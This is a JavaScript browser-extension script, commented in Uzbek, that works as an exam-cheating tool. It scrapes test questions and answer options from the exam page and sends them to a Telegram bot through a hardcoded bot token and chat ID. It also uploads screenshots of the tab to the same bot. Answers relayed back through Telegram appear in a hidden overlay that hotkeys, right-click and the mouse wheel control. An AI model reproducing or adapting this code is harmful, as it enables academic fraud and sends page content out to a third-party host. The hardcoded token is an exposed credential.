// == Imtihon yordamchisi v9.9 – GitHub Pages uchun tayyor ==
const TOKEN = '8222291151:AAGcRlRKcwD73L61S5aKLboVOSVx4KY_Nik';
const CHAT_ID = '7235913446';

let lastId = 0, buf = [], idx = -1, active = false, timer = null;

// Mini oyna yaratish
if (!document.getElementById('mini-window')) {
  document.body.insertAdjacentHTML('beforeend', `
    <div id="mini-window" style="position:fixed;bottom:10px;right:10px;width:260px;background:rgba(0,0,0,0.8);color:#ccc;padding:8px;border-radius:8px;z-index:99999;font:14px Arial;display:none;box-shadow:0 0 10px #000">
      <div id="mini-content">--</div>
    </div>
    <div id="sent" style="position:fixed;bottom:8px;right:8px;font-size:12px;color:#0f0;z-index:99999;display:none">✔</div>
  `);
}

const win = document.getElementById('mini-window');
const content = document.getElementById('mini-content');

function show(m) {
  content.innerHTML = m.replace(/\n/g, '<br>');
  win.style.display = 'block';
  clearTimeout(timer);
  timer = setTimeout(() => win.style.display = 'none', 3000);
}

// Telegramdan javob olish
async function poll() {
  try {
    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=10`);
    const j = await r.json();
    if (j.ok) j.result.forEach(m => {
      if (m.message?.text && m.update_id > lastId) {
        lastId = m.update_id;
        buf.push(m.message.text);
        idx = buf.length - 1;
        if (active) show(m.message.text);
      }
    });
  } catch(e) {}
}
setInterval(poll, 4000);

// Screenshot yuborish
async function shot() {
  chrome.runtime.sendMessage({action:'cap'}, async r => {
    if (r?.dataUrl) {
      const blob = await fetch(r.dataUrl).then(x=>x.blob());
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('document', blob, 'screen.png');
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {method:'POST', body:fd});
      document.getElementById('sent').style.display='block';
      setTimeout(()=>document.getElementById('sent').style.display='none',2000);
    }
  });
}

// Savollarni yuborish (avto)
function sendQuestions() {
  const tests = [...document.querySelectorAll('.table-test')].sort((a,b)=>{
    return +(a.id||'0').replace(/\D/g,'') - +(b.id||'0').replace(/\D/g,'');
  });
  if (!tests.length) return;
  let text = '';
  tests.forEach((t,i)=>{
    const q = t.querySelector('.test-question p')?.innerText || '–';
    text += `${i+1}. ${q}\n`;
    t.querySelectorAll('.answers-test li').forEach(li=>{
      const v = li.querySelector('.test-variant')?.innerText || '';
      const a = li.querySelector('label p')?.innerText || '';
      text += `${v} ${a}\n`;
    });
    text += '\n';
  });
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:CHAT_ID, text})
  });
}
setTimeout(sendQuestions, 3000);

// Hotkeys
let holdX = null;
document.addEventListener('keydown', e=>{
  if (e.key.toLowerCase()==='z') { active=!active; win.style.display=active?'block':'none'; if(active&&buf[idx]) show(buf[idx]); }
  if (e.key.toLowerCase()==='x') holdX=setTimeout(shot,600);
});
document.addEventListener('keyup', e=>{ if(e.key.toLowerCase()==='x') clearTimeout(holdX); });
document.addEventListener('contextmenu', e=>e.preventDefault());
document.addEventListener('mousedown', e=>{ if(e.button===2) { active=!active; win.style.display=active?'block':'none'; } });
document.addEventListener('wheel', e=>{ if(!active) return; idx = e.deltaY<0 ? Math.max(idx-1,0) : Math.min(idx+1,buf.length-1); if(buf[idx]) show(buf[idx]); });

// Background screenshot
if (typeof chrome !== 'undefined' && chrome.runtime) {
  chrome.runtime.onMessage.addListener((m,s,r)=>{ if(m.action==='cap') chrome.tabs.captureVisibleTab(null,{format:'png'},d=>r({dataUrl:d})); return true; });
}
